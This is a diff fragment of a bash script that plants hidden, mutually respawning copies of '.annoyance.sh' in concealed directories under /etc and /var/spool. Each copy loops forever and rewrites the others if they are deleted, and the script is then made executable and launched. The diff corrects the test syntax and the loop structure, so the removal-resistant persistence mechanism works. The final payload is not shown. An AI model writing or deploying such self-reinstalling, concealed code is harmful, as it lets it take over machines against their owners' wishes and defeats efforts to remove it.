@@ -5,15 +5,15 @@ cat <<EOFA > /etc/.music/.noLookHere/.annoyance.sh
 #!/bin/bash
 while true
 do
-if ! [/var/spool/plymouth/.hidden/.annoyance.sh]
+if ! [ -f /var/spool/plymouth/.hidden/.annoyance.sh ]
 then
-if [/var/spool/plymouth/.hidden]
+if [ -d /var/spool/plymouth/.hidden ]
 then
 cat <<EOFB > /var/spool/plymouth/.hidden/.annoyance.sh
 #!/bin/bash
 while true
 do
-if [/var/spool/.annoyance.sh]
+if [ -f /var/spool/.annoyance.sh ]
 then
 else
 cat <<EOFC > /var/spool/.annoyance.sh
@@ -31,14 +31,14 @@ sleep 60
 done
 EOFB
 else
-if [/var/spool/plymouth]
+if [ -d /var/spool/plymouth ]
 then
 mkdir .hidden
 cat <<EOFD > /var/spool/plymouth/.hidden/.annoyance.sh
 #!/bin/bash
 while true
 do
-if ! [/var/spool/.annoyance.sh]
+if ! [ -f /var/spool/.annoyance.sh ]
 then
 cat <<EOFE > /var/spool/.annoyance.sh
 #!/bin/bash
@@ -55,7 +55,7 @@ sleep 60
 done
 EOFD
 else
-if [/var/spool]
+if [ -d /var/spool ]
 then
 mkdir plymouth
 mkdir plymouth/.hidden
@@ -63,7 +63,7 @@ cat <<EOFF > /var/spool/plymouth/.hidden/.annoyance.sh
 #!/bin/bash
 while true
 do
-if ! [/var/spool/.annoyance.sh]
+if ! [ -f /var/spool/.annoyance.sh ]
 then
 cat <<EOFG > /var/spool/.annoyance.sh
 #!/bin/bash
@@ -79,10 +79,13 @@ fi
 sleep 60
 done
 EOFF
+chmod +x /var/spool/plymouth/.hidden/.annoyance.sh
 fi
 fi
-done
+fi
+fi
 sleep 120
+done
 EOFA
 chmod +x /etc/.music/.noLookHere/.annoyance.sh
 bash /etc/.music/.noLookHere/.annoyance.sh
